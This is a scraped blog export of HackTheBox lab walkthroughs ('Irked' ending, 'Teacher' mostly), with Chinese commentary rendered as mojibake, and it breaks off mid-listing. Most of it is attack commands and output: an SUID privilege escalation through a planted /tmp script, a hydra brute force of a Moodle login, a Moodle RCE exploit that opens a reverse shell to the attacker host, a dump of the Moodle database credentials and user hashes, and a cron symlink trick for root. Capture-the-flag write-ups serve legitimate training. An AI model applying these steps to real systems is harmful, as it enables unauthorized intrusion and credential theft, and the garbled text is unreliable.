2018 .bash_history-rw-r--r-- 1 ircd ircd 0 May 14 2018 .bashrc-rw-r--r-- 1 ircd ircd 66 May 14 2018 .selected_editordrwx------ 13 ircd ircd 4096 Mar 22 18:37 Unreal3.2 exeamine histroy command .bash_history 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849ircd@irked:~$ cat .bash_historycat .bash_historylscat aliasesls keysls keysls keys&#x2F;CVScd keyslsfile CVScd CVSlsls Rootcat Root&#x2F;Rootcd Rootlsfile Rootcat Rootcd &#x2F;lscd &#x2F;homelscd djmardovlsls *cd &#x2F;tmplsclearclearlscd &#x2F;lscd &#x2F;var&#x2F;www&#x2F;htmllscd &#x2F;tmpsudo -icd &#x2F;home&#x2F;ircdclearlsls -lahcd ..lscd djmardovlscd Documentsls -lahcat .backupclearexit Sensitive file /home/djmardov/Documents/.backup 1234ircd@irked:&#x2F;home&#x2F;djmardov&#x2F;Documents$ cat .backupcat .backupSuper elite steg backup pwUPupDOWNdownLRlrBAbaSSss Down the image 1$ wget http:&#x2F;&#x2F;10.10.10.117&#x2F;irked.jpg steghide extract file from the image 12345$ steghide extract -sf irked.jpgEnter passphrase: wrote extracted data to &quot;pass.txt&quot;.$ cat pass.txtKab6h+m+bbp2J:HG SSH port 22 123456789101112131415161718$ ssh djmardov@10.10.10.117The authenticity of host &#39;10.10.10.117 (10.10.10.117)&#39; can&#39;t be established.ECDSA key fingerprint is SHA256:kunqU6QEf9TV3pbsZKznVcntLklRwiVobFZiJguYs4g.Are you sure you want to continue connecting (yes&#x2F;no&#x2F;[fingerprint])? yesWarning: Permanently added &#39;10.10.10.117&#39; (ECDSA) to the list of known hosts.djmardov@10.10.10.117&#39;s password: The programs included with the Debian GNU&#x2F;Linux system are free software;the exact distribution terms for each program are described in theindividual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Tue May 15 08:56:32 2018 from 10.33.3.3djmardov@irked:~$ iduid&#x3D;1000(djmardov) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth)djmardov@irked:~$ cat ~&#x2F;Documents&#x2F;user.txt 4a66a78b12dc0e661a59d3f5c0267a8e Getting Root Access Find SUID directory 1234567891011121314151617181920212223djmardov@irked:~$ find &#x2F; -perm -4000 -user root -exec ls -ld &#123;&#125; \\; 2&gt;&#x2F;dev&#x2F;null;-rwsr-xr-- 1 root messagebus 362672 Nov 21 2016 &#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper-rwsr-xr-x 1 root root 9468 Mar 28 2017 &#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device-rwsr-xr-x 1 root root 13816 Sep 8 2016 &#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1-rwsr-xr-x 1 root root 562536 Nov 19 2017 &#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign-rwsr-xr-x 1 root root 13564 Oct 14 2014 &#x2F;usr&#x2F;lib&#x2F;spice-gtk&#x2F;spice-client-glib-usb-acl-helper-rwsr-xr-x 1 root root 1085300 Feb 10 2018 &#x2F;usr&#x2F;sbin&#x2F;exim4-rwsr-xr-- 1 root dip 338948 Apr 14 2015 &#x2F;usr&#x2F;sbin&#x2F;pppd-rwsr-xr-x 1 root root 43576 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;chsh-rwsr-sr-x 1 root mail 96192 Nov 18 2017 &#x2F;usr&#x2F;bin&#x2F;procmail-rwsr-xr-x 1 root root 78072 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;gpasswd-rwsr-xr-x 1 root root 38740 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;newgrp-rwsr-xr-x 1 root root 18072 Sep 8 2016 &#x2F;usr&#x2F;bin&#x2F;pkexec-rwsr-sr-x 1 root root 9468 Apr 1 2014 &#x2F;usr&#x2F;bin&#x2F;X-rwsr-xr-x 1 root root 53112 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;passwd-rwsr-xr-x 1 root root 52344 May 17 2017 &#x2F;usr&#x2F;bin&#x2F;chfn-rwsr-xr-x 1 root root 7328 May 16 2018 &#x2F;usr&#x2F;bin&#x2F;viewuser-rwsr-xr-x 1 root root 96760 Aug 13 2014 &#x2F;sbin&#x2F;mount.nfs-rwsr-xr-x 1 root root 38868 May 17 2017 &#x2F;bin&#x2F;su-rwsr-xr-x 1 root root 34684 Mar 29 2015 &#x2F;bin&#x2F;mount-rwsr-xr-x 1 root root 34208 Jan 21 2016 &#x2F;bin&#x2F;fusermount-rwsr-xr-x 1 root root 161584 Jan 28 2017 &#x2F;bin&#x2F;ntfs-3g-rwsr-xr-x 1 root root 26344 Mar 29 2015 &#x2F;bin&#x2F;umount Inspect the viewuser binary 123456djmardov@irked:~$ &#x2F;usr&#x2F;bin&#x2F;viewuserThis application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)sh: 1: &#x2F;tmp&#x2F;listusers: not found viewuserä¼¼ä¹å°è¯•æ‰§è¡Œ/tmpä¸­åä¸ºlistuserçš„ä¸å­˜åœ¨çš„è„šæœ¬ï¼Œå‘è„šæœ¬ä¸­å†™å…¥bashå‘½ä»¤ 1234567891011121314151617djmardov@irked:&#x2F;tmp$ touch listusersdjmardov@irked:&#x2F;tmp$ echo &#39;#!&#x2F;bin&#x2F;bash&#39; &gt;&gt; listusers djmardov@irked:&#x2F;tmp$ echo &#39;&#x2F;bin&#x2F;sh&#39; &gt;&gt; listusers djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser This application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)sh: 1: &#x2F;tmp&#x2F;listusers: Permission denieddjmardov@irked:&#x2F;tmp$ chmod 777 listusers djmardov@irked:&#x2F;tmp$ &#x2F;usr&#x2F;bin&#x2F;viewuser This application is being devleoped to set and test user permissionsIt is still being actively developed(unknown) :0 2020-03-22 18:37 (:0)djmardov pts&#x2F;1 2020-03-23 09:52 (10.10.16.99)# iduid&#x3D;0(root) gid&#x3D;1000(djmardov) groups&#x3D;1000(djmardov),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),110(lpadmin),113(scanner),117(bluetooth) 0x04 Conclusion","tags":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/tags/%E9%9D%B6%E6%9C%BA/"}],"categories":[{"name":"é¶æœº","slug":"é¶æœº","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/"},{"name":"HTB","slug":"é¶æœº/HTB","permalink":"http://ca0y1h.top/categories/%E9%9D%B6%E6%9C%BA/HTB/"}]},{"title":"HTB::Teacher Walkthrough","date":"2020-03-24T14:08:26.000Z","path":"Target_drone/HackTheBox/8.HTB-Teacher-walkthrough/","text":"HTB::Teacher Walkthrough 0x01 Info Card 0x02 Tools and Tips nmap nikto dirb dirsearch hydra hash-identifier Moodle 3.4.1 - Remote Code Execute 0x03 Pentesting Initial Enumeration nmapæ‰«æé¶æœºTCPç«¯å£ 1234567891011121314151617181920212223242526272829303132333435Î» nmap -sV -A -Pn -T4 10.10.10.153Starting Nmap 7.80 ( https:&#x2F;&#x2F;nmap.org ) at 2020-03-22 13:08 ?D1ÃºÂ±ÃªÃ—?ÃªÂ±??Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth ScanSYN Stealth Scan Timing: About 56.13% done; ETC: 13:08 (0:00:04 remaining)Stats: 0:00:35 elapsed; 0 hosts completed (1 up), 1 undergoing TracerouteTraceroute Timing: About 32.26% done; ETC: 13:08 (0:00:00 remaining)Nmap scan report for 10.10.10.153Host is up (0.23s latency).Not shown: 999 closed portsPORT STATE SERVICE VERSION80&#x2F;tcp open http Apache httpd 2.4.25 ((Debian))|_http-server-header: Apache&#x2F;2.4.25 (Debian)|_http-title: Blackhat highschoolNo exact OS matches for host (If you know what OS is running on it, see https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; ).TCP&#x2F;IP fingerprint:OS:SCAN(V&#x3D;7.80%E&#x3D;4%D&#x3D;3&#x2F;22%OT&#x3D;80%CT&#x3D;1%CU&#x3D;39891%PV&#x3D;Y%DS&#x3D;2%DC&#x3D;T%G&#x3D;Y%TM&#x3D;5E76F2EOS:3%P&#x3D;i686-pc-windows-windows)SEQ(SP&#x3D;104%GCD&#x3D;1%ISR&#x3D;10A%TI&#x3D;Z%CI&#x3D;I%II&#x3D;I%TS&#x3D;8OS:)SEQ(CI&#x3D;I%II&#x3D;I)OPS(O1&#x3D;M54DST11NW7%O2&#x3D;M54DST11NW7%O3&#x3D;M54DNNT11NW7%O4&#x3D;M54DOS:ST11NW7%O5&#x3D;M54DST11NW7%O6&#x3D;M54DST11)WIN(W1&#x3D;7120%W2&#x3D;7120%W3&#x3D;7120%W4&#x3D;7120%WOS:5&#x3D;7120%W6&#x3D;7120)ECN(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;7210%O&#x3D;M54DNNSNW7%CC&#x3D;Y%Q&#x3D;)T1(R&#x3D;Y%DF&#x3D;YOS:%T&#x3D;40%S&#x3D;O%A&#x3D;S+%F&#x3D;AS%RD&#x3D;0%Q&#x3D;)T2(R&#x3D;N)T3(R&#x3D;N)T4(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%FOS:&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T5(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RD&#x3D;0%Q&#x3D;)T6(R&#x3D;Y%DF&#x3D;Y%OS:T&#x3D;40%W&#x3D;0%S&#x3D;A%A&#x3D;Z%F&#x3D;R%O&#x3D;%RD&#x3D;0%Q&#x3D;)T7(R&#x3D;Y%DF&#x3D;Y%T&#x3D;40%W&#x3D;0%S&#x3D;Z%A&#x3D;S+%F&#x3D;AR%O&#x3D;%RDOS:&#x3D;0%Q&#x3D;)U1(R&#x3D;Y%DF&#x3D;N%T&#x3D;40%IPL&#x3D;164%UN&#x3D;0%RIPL&#x3D;G%RID&#x3D;G%RIPCK&#x3D;G%RUCK&#x3D;G%RUD&#x3D;G)IEOS:(R&#x3D;Y%DFI&#x3D;N%T&#x3D;40%CD&#x3D;S)Network Distance: 2 hopsTRACEROUTE (using port 110&#x2F;tcp)HOP RTT ADDRESS1 230.00 ms 10.10.14.12 232.00 ms 10.10.10.153OS and Service detection performed. Please report any incorrect results at https:&#x2F;&#x2F;nmap.org&#x2F;submit&#x2F; .Nmap done: 1 IP address (1 host up) scanned in 41.73 seconds ç”¨dirsearchæ‰«æç½‘ç«™ 1234[01:00:42] 301 - 310B - &#x2F;css -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;css&#x2F; [01:00:54] 301 - 312B - &#x2F;fonts -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;fonts&#x2F; [01:01:01] 301 - 313B - &#x2F;images -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;images&#x2F; [01:01:03] 200 - 8KB - &#x2F;index.html [01:01:06] 301 - 317B - &#x2F;javascript -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;javascript&#x2F; [01:01:07] 301 - 309B - &#x2F;js -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;js&#x2F;[01:01:15] 301 - 313B - &#x2F;manual -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;manual&#x2F;[01:01:15] 200 - 626B - &#x2F;manual&#x2F;index.html[01:01:19] 301 - 313B - &#x2F;moodle -&gt; http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; Getting User Access å»çœ‹ä¸€ä¸‹imagesç›®å½•ï¼š ä¸€ä¸ªä¸ªç‚¹å¼€çœ‹ä¸€ä¸‹ï¼Œå‘ç°5.pngæ— æ³•æ˜¾ç¤ºï¼Œåº”è¯¥ä¸æ˜¯ä¸€ä¸ªå›¾ç‰‡ï¼Œä¸‹è½½åç”¨Notepad++æ‰“å¼€ 12345678Hi Servicedesk,I forgot the last charachter of my password. The only part I remembered is Th4C00lTheacha.Could you guys figure out what the last charachter is, or just reset it?Thanks,Giovanni è®©æˆ‘ä»¬çŒœè§£å¯†ç çš„æœ€åä¸€ä½ï¼Œä½†æ˜¯ç°åœ¨ä¸çŸ¥é“ç”¨æˆ·åå’Œå¯†ç æ˜¯ç”¨åœ¨å“ªç™»å½•çš„ï¼Œå†å»çœ‹moodleç›®å½• Moodleæ˜¯ä¸€ä¸ªå¼€æºè¯¾ç¨‹ç®¡ç†ç³»ç»Ÿï¼ˆCMSï¼‰ï¼Œä¹Ÿè¢«ç§°ä¸ºå­¦ä¹ ç®¡ç†ç³»ç»Ÿï¼ˆLMSï¼‰æˆ–è™šæ‹Ÿå­¦ä¹ ç¯å¢ƒï¼ˆVLEï¼‰ã€‚å®ƒå·²æˆä¸ºæ·±å—ä¸–ç•Œå„åœ°æ•™è‚²å·¥ä½œè€…å–œçˆ±çš„ä¸€ç§ä¸ºå­¦ç”Ÿå»ºç«‹ç½‘ä¸ŠåŠ¨æ€ç½‘ç«™çš„å·¥å…·ã€‚ ç”¨hydraçˆ†ç ´å¯†ç ä¹‹å‰å…ˆç”¨Pythonç”Ÿæˆä¸€ä¸ªå¯†ç å­—å…¸ï¼š 123with open(&#x27;pwd.txt&#x27;, &#x27;w&#x27;) as f: for i in range(0, 127): f.write(&#x27;Th4C00lTheacha&#123;&#125;\\n&#x27;.format(chr(i))) å†ç”¨hydraè¿›è¡Œå¯†ç çˆ†ç ´ï¼Œç”±äºåªæœ‰åœ¨æˆ‘ä»¬æäº¤æ­£ç¡®çš„å¯†ç åæ‰è®¾ç½®Cookieï¼Œå› æ­¤æˆ‘ä»¬ä¼šåœ¨Set-Cookieä¸Šå°†å…¶åŒ¹é…ä¸ºæ­£ç¡®çš„å“åº”ã€‚ 123456789$ hydra -I -l giovanni -P pwd.txt 10.10.10.153 http-post-form &quot;&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie&quot;Hydra v9.0 (c) 2019 by van Hauser&#x2F;THC - Please do not use in military or secret service organizations, or for illegal purposes.Hydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) starting at 2020-03-22 04:23:47[DATA] max 16 tasks per 1 server, overall 16 tasks, 128 login tries (l:1&#x2F;p:128), ~8 tries per task[DATA] attacking http-post-form:&#x2F;&#x2F;10.10.10.153:80&#x2F;moodle&#x2F;login&#x2F;index.php:username&#x3D;^USER^&amp;password&#x3D;^PASS^:S&#x3D;Set-Cookie[80][http-post-form] host: 10.10.10.153 login: giovanni password: Th4C00lTheacha#1 of 1 target successfully completed, 1 valid password foundHydra (https:&#x2F;&#x2F;github.com&#x2F;vanhauser-thc&#x2F;thc-hydra) finished at 2020-03-22 04:23:58 æ‰¾åˆ°äº†å¯†ç login: giovanni&amp;password: Th4C00lTheacha#ã€‚ åŒæ—¶ç”¨niktoæ‰«æä¸€ä¸‹æœ‰ç”¨çš„ä¿¡æ¯ï¼š 123456789101112131415161718192021222324252627282930313233343536$ nikto -host http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle - Nikto v2.1.6 --------------------------------------------------------------------------- + Target IP: 10.10.10.153 + Target Hostname: 10.10.10.153+ Target Port: 80+ Start Time: 2020-03-22 02:49:41 (GMT-4)---------------------------------------------------------------------------+ Server: Apache&#x2F;2.4.25 (Debian)+ Cookie MoodleSession created without the httponly flag+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS+ Uncommon header &#39;content-script-type&#39; found, with contents: text&#x2F;javascript+ Uncommon header &#39;content-style-type&#39; found, with contents: text&#x2F;css+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type+ No CGI Directories found (use &#39;-C all&#39; to force check all possible dirs)+ Apache&#x2F;2.4.25 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS + Web Server returns a valid response with junk HTTP methods, this may cause false positives.+ DEBUG HTTP verb may show server debugging information. See http:&#x2F;&#x2F;msdn.microsoft.com&#x2F;en-us&#x2F;library&#x2F;e8z01xdh%28VS.80%29.aspx for details.+ &#x2F;moodle&#x2F;config.php: PHP Config file may contain database IDs and passwords.+ Uncommon header &#39;x-accel-buffering&#39; found, with contents: no+ OSVDB-3092: &#x2F;moodle&#x2F;auth&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;backup&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;backup&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;install&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;install&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;lib&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;login&#x2F;: This might be interesting...+ OSVDB-3268: &#x2F;moodle&#x2F;pix&#x2F;: Directory indexing found.+ OSVDB-3092: &#x2F;moodle&#x2F;pix&#x2F;: This might be interesting...+ OSVDB-3092: &#x2F;moodle&#x2F;INSTALL.txt: Default file found.+ OSVDB-3268: &#x2F;moodle&#x2F;repository&#x2F;: Directory indexing found.+ &#x2F;moodle&#x2F;repository&#x2F;: CRX WebDAV upload+ &#x2F;moodle&#x2F;composer.json: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;+ &#x2F;moodle&#x2F;composer.lock: PHP Composer configuration file reveals configuration information - https:&#x2F;&#x2F;getcomposer.org&#x2F;+ &#x2F;moodle&#x2F;package.json: Node.js package file found. It may contain sensitive information.+ 7871 requests: 0 error(s) and 26 item(s) reported on remote host+ End Time: 2020-03-22 03:27:50 (GMT-4) (2289 seconds)---------------------------------------------------------------------------+ 1 host(s) tested ä¸»è¦æ˜¯æœ‰ä¸¤ä¸ªæ–‡ä»¶å€¼å¾—æ³¨æ„ï¼š /moodle/config.php /moodle/INSTALL.txt configé…ç½®æ–‡ä»¶ä¹‹åä¼šç”¨åˆ°ï¼Œè€ŒINSTALLæ–‡ä»¶å‘Šè¯‰äº†æˆ‘ä»¬å½“å‰moodleçš„ç‰ˆæœ¬æ˜¯3.2ã€‚ æœä¸€ä¸‹moodleç›¸å…³çš„æ¼æ´ï¼š è¯•ä¸€ä¸‹Moodle 3.4.1 - Remote Code Executeçš„åˆ©ç”¨æ–¹å¼ï¼š 1234567891011121314151617181920212223242526272829303132$ sudo php 46551.php url&#x3D;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#x2F; user&#x3D;giovanni pass&#x3D;Th4C00lTheacha# ip&#x3D;10.10.16.89 port&#x3D;4444 course&#x3D;2*------------------------------** Noodle [Moodle RCE] (v3.4.1) **------------------------------*[!] Make sure you have a listener[!] at 10.10.16.89:4444[*] Logging in as user giovanni with password Th4C00lTheacha# [+] Successful Login[&gt;] Moodle Session q86b6t60vldlqjk0gp90u5mat0 [&gt;] Moodle Key N25C2hyBzu [*] Loading Course ID 2 [+] Successfully Loaded Course[*] Enable Editing[+] Successfully Enabled Course Editing[*] Adding Quiz[+] Successfully Added Quiz[*] Configuring New Quiz[+] Successfully Configured Quiz[*] Loading Edit Quiz Page [+] Successfully Loaded Edit Quiz Page[*] Adding Calculated Question [+] Successfully Added Calculation Question[*] Adding Evil Question [+] Successfully Created Evil Question[*] Sending Exploit[&gt;] You should receive a reverse shell attempt from the target at 10.10.16.89 on port 4444 [&gt;] If connection was successful this program will wait here until you close the connection.[&gt;] You should be able to Ctrl+C and retain the connection through netcat. æœ¬æœºç›‘å¬4444ç«¯å£ 1$ nc -lvvp 4444 listening on [any] 4444 ... 10.10.10.153: inverse host lookup failed: Unknown host connect to [10.10.16.89] from (UNKNOWN) [10.10.10.153] 42232 &#x2F;bin&#x2F;sh: 0: can&#39;t access tty; job control turned off $ python -c &#39;import pty;pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39; www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle&#x2F;question$ id id uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) æŸ¥çœ‹config.phpç½‘ç«™æ–‡ä»¶ 1234567891011121314151617181920212223242526272829303132www-data@teacher:&#x2F;var&#x2F;www&#x2F;html&#x2F;moodle$ cat config.phpcat config.php&lt;?php &#x2F;&#x2F; Moodle configuration fileunset($CFG);global $CFG;$CFG &#x3D; new stdClass();$CFG-&gt;dbtype &#x3D; &#39;mariadb&#39;;$CFG-&gt;dblibrary &#x3D; &#39;native&#39;;$CFG-&gt;dbhost &#x3D; &#39;localhost&#39;;$CFG-&gt;dbname &#x3D; &#39;moodle&#39;;$CFG-&gt;dbuser &#x3D; &#39;root&#39;;$CFG-&gt;dbpass &#x3D; &#39;Welkom1!&#39;;$CFG-&gt;prefix &#x3D; &#39;mdl_&#39;;$CFG-&gt;dboptions &#x3D; array ( &#39;dbpersist&#39; &#x3D;&gt; 0, &#39;dbport&#39; &#x3D;&gt; 3306, &#39;dbsocket&#39; &#x3D;&gt; &#39;&#39;, &#39;dbcollation&#39; &#x3D;&gt; &#39;utf8mb4_unicode_ci&#39;,);$CFG-&gt;wwwroot &#x3D; &#39;http:&#x2F;&#x2F;10.10.10.153&#x2F;moodle&#39;;$CFG-&gt;dataroot &#x3D; &#39;&#x2F;var&#x2F;www&#x2F;moodledata&#39;;$CFG-&gt;admin &#x3D; &#39;admin&#39;;$CFG-&gt;directorypermissions &#x3D; 0777;require_once(__DIR__ . &#39;&#x2F;lib&#x2F;setup.php&#39;);&#x2F;&#x2F; There is no php closing tag in this file,&#x2F;&#x2F; it is intentional because it prevents trailing whitespace problems! è¿™é‡Œåˆ—å‡ºäº†MySQLæ•°æ®åº“çš„ç™»å½•ç”¨æˆ·åå’Œå¯†ç ï¼šrootå’ŒWelkom1! 12345678910111213www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ mysql -u root -p mysql -u root -p Enter password: Welkom1! Welcome to the MariaDB monitor. Commands end with ; or \\g. Your MariaDB connection id is 949 Server version: 10.1.26-MariaDB-0+deb9u1 Debian 9.1 Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others. Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.......MariaDB [moodle]&gt; select username, password from mdl_user;select username, password from mdl_user;+-------------+--------------------------------------------------------------+| username | password |+-------------+--------------------------------------------------------------+| guest | $2y$10$ywuE5gDlAlaCu9R0w7pKW.UCB0jUH6ZVKcitP3gMtUNrAebiGMOdO || admin | $2y$10$7VPsdU9&#x2F;9y2J4Mynlt6vM.a4coqHRXsNTOq&#x2F;1aA6wCWTsF2wtrDO2 || giovanni | $2y$10$38V6kI7LNudORa7lBAT0q.vsQsv4PemY7rf&#x2F;M1Zkj&#x2F;i1VqLO0FSYO || Giovannibak | 7a860966115182402ed06375cf0a22af |+-------------+--------------------------------------------------------------+4 rows in set (0.00 sec) æŸ¥çœ‹é‚£ä¸€ä¸²æ•°å­—çš„åŠ å¯†æ–¹å¼ 123456789101112131415161718$ hash-identifier 7a860966115182402ed06375cf0a22af ######################################################################### # __ __ __ ______ _____ # # &#x2F;\\ \\&#x2F;\\ \\ &#x2F;\\ \\ &#x2F;\\__ _\\ &#x2F;\\ _ &#96;\\ # # \\ \\ \\_\\ \\ __ ____ \\ \\ \\___ \\&#x2F;_&#x2F;\\ \\&#x2F; \\ \\ \\&#x2F;\\ \\ # # \\ \\ _ \\ &#x2F;&#39;__&#96;\\ &#x2F; ,__\\ \\ \\ _ &#96;\\ \\ \\ \\ \\ \\ \\ \\ \\ # # \\ \\ \\ \\ \\&#x2F;\\ \\_\\ \\_&#x2F;\\__, &#96;\\ \\ \\ \\ \\ \\ \\_\\ \\__ \\ \\ \\_\\ \\ # # \\ \\_\\ \\_\\ \\___ \\_\\&#x2F;\\____&#x2F; \\ \\_\\ \\_\\ &#x2F;\\_____\\ \\ \\____&#x2F; # # \\&#x2F;_&#x2F;\\&#x2F;_&#x2F;\\&#x2F;__&#x2F;\\&#x2F;_&#x2F;\\&#x2F;___&#x2F; \\&#x2F;_&#x2F;\\&#x2F;_&#x2F; \\&#x2F;_____&#x2F; \\&#x2F;___&#x2F; v1.2 # # By Zion3R # # www.Blackploit.com # # Root@Blackploit.com # #########################################################################--------------------------------------------------Possible Hashs:[+] MD5[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username))) 7a860966115182402ed06375cf0a22afmd5è§£å¯† 12345678910www-data@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ su giovannisu giovanniPassword: expelledgiovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ididuid&#x3D;1000(giovanni) gid&#x3D;1000(giovanni) groups&#x3D;1000(giovanni)giovanni@teacher:&#x2F;var&#x2F;www&#x2F;moodledata$ ls &#x2F;home&#x2F;giovanni&#x2F; ls &#x2F;home&#x2F;giovanni&#x2F;user.txt work Getting Root Access 123456789101112131415161718192021222324252627282930giovanni@teacher:~&#x2F;work$ ls -lRls -lR.:total 8drwxr-xr-x 3 giovanni giovanni 4096 Jun 27 2018 coursesdrwxr-xr-x 3 giovanni giovanni 4096 Jun 27 2018 tmp.&#x2F;courses:total 4drwxr-xr-x 2 root root 4096 Jun 27 2018 algebra.&#x2F;courses&#x2F;algebra:total 4-rw-r--r-- 1 giovanni giovanni 109 Jun 27 2018 answersAlgebra.&#x2F;tmp:total 8-rwxrwxrwx 1 root root 256 Mar 22 16:08 backup_courses.tar.gzdrwxrwxrwx 3 root root 4096 Jun 27 2018 courses.&#x2F;tmp&#x2F;courses:total 4drwxrwxrwx 2 root root 4096 Jun 27 2018 algebra.&#x2F;tmp&#x2F;courses&#x2F;algebra:total 4-rwxrwxrwx 1 giovanni giovanni 109 Jun 27 2018 answersAlgebragiovanni@teacher:~&#x2F;work$ datedateSun Mar 22 16:08:17 CET 2020 æˆ‘ä»¬å¯ä»¥å‘ç°/tmp/backup_courses.tar.gzçš„æ—¶é—´å°±æ˜¯å½“å‰çš„æ—¶é—´ï¼ŒçŒœæµ‹è¿™åº”è¯¥æ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ã€‚ å®šæ—¶ä»»åŠ¡çš„è„šæœ¬ä½äº/usr/bin/backup.shï¼š 123456#!&#x2F;bin&#x2F;bashcd &#x2F;home&#x2F;giovanni&#x2F;work;tar -czvf tmp&#x2F;backup_courses.tar.gz courses&#x2F;*;cd tmp;tar -xf backup_courses.tar.gz;chmod 777 * -R; æˆ‘é—¨åªéœ€è¦çœ‹åˆ°è¿™ä¸ªè„šæœ¬æ‰§è¡Œå~/tmpç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„æƒé™å˜æˆäº†777ï¼Œé‚£ä¹ˆç°åœ¨å°±å¾ˆå®¹æ˜“äº†ï¼Œåœ¨tmpç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªæ ¹ç›®å½•çš„è½¯è¿æ¥å³å¯ã€‚ 12345678910111213141516171819202122232425262728293031323334giovanni@teacher:~&#x2F;work&#x2F;tmp$ ln -s &#x2F; ca01hln -s &#x2F; ca01hgiovanni@teacher:~&#x2F;work&#x2F;tmp$ ls -la &#x2F;ls -la &#x2F;total 84drwxrwxrwx 22 root root 4096 Oct 28 2018 .drwxrwxrwx 22 root root 4096 Oct 28 2018 ..drwxrwxrwx 2 root root 4096 Oct 28 2018 bindrwxrwxrwx 3 root root 4096 Oct 28 2018 bootdrwxrwxrwx 17 root root 3080 Mar 22 05:06 devdrwxrwxrwx 84 root root 4096 Oct 28 2018 etcdrwxrwxrwx 3 root root 4096 Jun 27 2018 homelrwxrwxrwx 1 root root 29 Oct 28 2018 initrd.img -&gt; boot&#x2F;initrd.img-4.9.0-8-amd64lrwxrwxrwx 1 root root 29 Oct 28 2018 initrd.img.old -&gt; boot&#x2F;initrd.img-4.9.0-6-amd64drwxrwxrwx 15 root root 4096 Jun 27 2018 libdrwxrwxrwx 2 root root 4096 Jun 27 2018 lib64drwxrwxrwx 2 root root 16384 Jun 27 2018 lost+founddrwxrwxrwx 3 root root 4096 Jun 27 2018 mediadrwxrwxrwx 2 root root 4096 Jun 27 2018 mntdrwxrwxrwx 2 root root 4096 Jun 27 2018 optdrwxrwxrwx 93 root root 0 Mar 22 05:06 procdrwxrwxrwx 3 root root 4096 Nov 4 2018 rootdrwxrwxrwx 18 root root 500 Mar 22 05:06 rundrwxrwxrwx 2 root root 4096 Oct 28 2018 sbindrwxrwxrwx 2 root root 4096 Jun 27 2018 srvdrwxrwxrwx 13 root root 0 Mar 22 16:19 sysdrwxrwxrwx 2 root root 4096 Mar 22 06:26 tmpdrwxrwxrwx 10 root root 4096 Jun 27 2018 usrdrwxrwxrwx 12 root root 4096 Jun 27 2018 varlrwxrwxrwx 1 root root 26 Oct 28 2018 vmlinuz -&gt; 